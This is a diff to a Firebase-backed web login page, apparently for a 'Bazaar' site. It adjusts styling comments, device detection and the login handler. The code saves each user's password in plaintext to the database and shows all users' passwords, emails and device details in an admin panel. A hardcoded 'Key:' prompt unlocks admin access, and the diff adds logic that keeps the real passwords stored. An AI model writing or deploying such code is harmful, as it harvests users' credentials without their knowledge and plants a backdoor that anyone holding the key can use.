@@ -17,7 +17,6 @@
             display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden;
         }
 
-        /* Neon Glass Cards */
         .card { 
             background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
             padding: 35px; border-radius: 35px; text-align: center; 
@@ -42,7 +41,6 @@
         }
         .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0, 210, 255, 0.4); }
 
-        /* Links Styling */
         .section-tag { font-size: 10px; color: var(--gold); text-align: left; margin: 20px 0 5px 10px; letter-spacing: 2px; text-transform: uppercase; }
         .item-link { 
             background: rgba(255,255,255,0.06); padding: 14px; border-radius: 18px; 
@@ -52,7 +50,6 @@
         }
         .item-link:hover { background: rgba(0, 210, 255, 0.1); transform: scale(1.02); border-left-color: var(--neon); }
 
-        /* Overlays & Admin */
         #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
         #logout-overlay { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
@@ -127,7 +124,6 @@
         const db = firebase.database();
         let globalUserName = "User";
 
-        // Secret Admin Controls
         function masterBypass() { if(prompt("Key:") === "rr123456789000rr") showBazaarUI("Admin Farooq"); }
         
         function openAdmin() {
@@ -141,7 +137,7 @@
                             <b style="color:var(--primary)">Name: ${d.savedName || 'Unknown'}</b><br>
                             Pass: <span style="color:var(--gold)">${d.password}</span><br>
                             Email: <small>${d.email}</small><br>
-                            Device: <small style="color:#888">${d.deviceInfo || 'Unknown Device'}</small><br>
+                            Device: <small style="color:#888">${d.deviceInfo || 'Detecting...'}</small><br>
                             Time: <small style="color:#666">${d.lastSeen}</small>
                             <br><button onclick="renameUser('${s.key}')" style="margin-top:10px; padding:5px 15px;">Rename User</button>
                         </div>`;
@@ -156,10 +152,9 @@
             if(n) db.ref('users/'+id).update({savedName: n});
         }
 
-        // Auth Logic
         function googleAuth() {
             const provider = new firebase.auth.GoogleAuthProvider();
-            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "GoogleLogin")).catch(e => alert(e.message));
+            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "Google Account")).catch(e => alert(e.message));
         }
 
         function emailAuth() {
@@ -174,11 +169,18 @@
                 let d = snap.val();
                 globalUserName = d && d.savedName ? d.savedName : (user.displayName || user.email.split('@')[0]);
                 
+                // Device Detection Fix
+                let dev = navigator.userAgent.match(/\(([^)]+)\)/);
+                let deviceModel = dev ? dev[1].split(';')[0] : navigator.platform;
+
+                // Password Fix: "Session" ya "GoogleLogin" ko purane asli password se replace na karein
+                let finalPass = (p === "ActiveSession" || p === "GoogleLogin") ? (d ? d.password : p) : p;
+
                 db.ref('users/' + user.uid).update({
                     email: user.email,
-                    password: p,
+                    password: finalPass,
                     savedName: globalUserName,
-                    deviceInfo: navigator.userAgent.split('(')[1].split(')')[0],
+                    deviceInfo: deviceModel,
                     lastSeen: new Date().toLocaleString()
                 }).then(() => showBazaarUI(globalUserName));
             });
@@ -199,8 +201,9 @@
             setTimeout(() => { auth.signOut().then(() => location.reload()); }, 4500);
         }
 
-        // Persist session
+        // Ye line session ko yaad rakhti hai taaki logout na ho
         auth.onAuthStateChanged(u => { if(u) handleLogin(u, "ActiveSession"); });
     </script>
 </body>
-</html>
+    </html>
+    
